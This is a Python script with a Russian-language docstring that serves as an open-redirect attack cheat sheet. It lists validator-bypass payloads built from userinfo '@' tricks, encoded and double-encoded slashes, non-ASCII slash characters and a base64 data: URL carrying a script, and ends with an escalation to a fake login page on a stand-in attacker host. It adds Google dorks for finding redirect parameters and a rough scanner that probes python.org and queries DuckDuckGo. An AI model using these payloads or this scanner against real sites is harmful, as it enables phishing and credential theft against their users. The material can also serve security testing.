import webbrowser
import requests
import sys
import urllib3
import certifi
import time

""" *** Open Redirect ***
Внутренние opendirects:
https://example.com/login?redirect=https://example.com/settings
https://example.com/login?redirect=https://atacker.com
Перенаправление на основе реферера(заголовок HTTP запроса):
<html>
<a href="https://example.com/login">Click here to log in to
example.com</a>
</html>
Примеры перенаправлений:
https://example.com/login?redirect=https://example.com/dashboard
https://example.com/login?redir=https://example.com/dashboard
https://example.com/login?next=https://example.com/dashboard
https://example.com/login?next=/dashboard
Google Dorks:
site:example.com
inurl:%3Dhttp
inurl:%3D%2F
nurl:redir site:example.com
inurl:redirect site:example.com
inurl:redirecturi site:example.com
inurl:redirect_uri site:example.com
inurl:redirecturl site:example.com
inurl:redirect_uri site:example.com
inurl:return site:example.com
inurl:returnurl site:example.com
inurl:relaystate site:example.com
inurl:forward site:example.com
inurl:forwardurl site:example.com
inurl:forward_url site:example.com
inurl:url site:example.com
inurl:uri site:example.com
inurl:dest site:example.com
inurl:destination site:example.com
inurl:next site:example.com
Обход защиты:
scheme://userinfo@hostname:port/path?query
https://user:password:8080/example.com@attacker.com
Автозамены в браузере:
https:attacker.com
https;attacker.com
https:\/\/attacker.com
https:/\/\attacker.com
https://attacker.com\@example.com
https://attacker.com/@example.com
Ошибки валидатора:
https://example.com/login?redir=http://example.com.attacker.com
https://example.com/login?redir=http://attacker.com/example.com
https://example.com/login?redir=https://example.com.attacker.com/
example.com
Использование данных URL-адрессов
data:MEDIA_TYPE[;base64],DATA
data:text/plain,hello!
data:text/plain;base64,aGVsbG8h
data:text/html;base64,
PHNjcmlwdD5sb2NhdGlvbj0iaHR0cHM6Ly9leGFtcGxlLmNvbSI8L3NjcmlwdD4=
<script>location="https://example.com"</script>
https://example.com/login?redir=data:text/html;base64,
PHNjcmlwdD5sb2NhdGlvbj0iaHR0cHM6Ly9leGFtcGxlLmNvbSI8L3NjcmlwdD4=
Двойное кодирование:
https://example.com/@attacker.com.
Вот URL-адрес с косой чертой в кодировке URL:
https://example.com%2f@attacker.com
А вот URL с двойной косой чертой:
https://example.com%252f@attacker.com
Наконец, вот URL-адрес с тройной косой чертой:
https://example.com%25252f@attacker.com
https://attacker.com%252f@example.com
https://attacker.com/@example.com
Не-ASCII-символы:
https://attacker.com%ff.example.com
https://attacker.com?.example.com
╱ (%E2%95%B1)
https://attacker.com╱.example.com
Комбинироване методов эксплойта
https://example.com%252f@attacker.com/example.com
https://example.com/@attacker.com/example.com
Эскалация атаки:
https://example.com/login?next=https://attacker.com/fake_login.html"""

count = 0
http = urllib3.PoolManager(ca_certs=certifi.where())
url = 'https://python.org/'
search_url = 'https://duckduckgo.com/'
target = 'python.org'
redirects = ['redirect-to?url=/','redirect_to?url=/','?n=/', '?TTT=/']
my_dorks = [f'site:{target}',
            f'site:{target} inurl:%3Dhttp:github.com',
            f'site:{target} inurl:redir site:github.com',
            f'site:{target} inurl:%3D%2F:github.com',
            f'site:{target}/?n=%3Dhttp:github.com',
            f'site:{target} inurl:/account/register/ site:pypi.org']
firefox_path = r"/usr/bin/firefox"
webbrowser.register('firefox', None,webbrowser.BackgroundBrowser(firefox_path))

for redirect in redirects:
    resp = http.request('GET', url+redirect, redirect=True)
    #req = requests.get(url+payload)
    if redirect not in resp:
        print(redirect,resp.status)
        #print(resp.geturl())
        #print(resp.info())
    else:
        print('Mot redirect')

for dork in my_dorks:
    resp = http.request('GET', search_url + dork, redirect=True)
    #req = requests.get(url+payload)
    if dork not in resp:
        print(dork,resp.status)
        print(resp.geturl())
        #print(resp.info())
    else:
        print('Mot redirect')
#for dork in my_dorks:
    #webbrowser.get('firefox').open(search_url + dork)
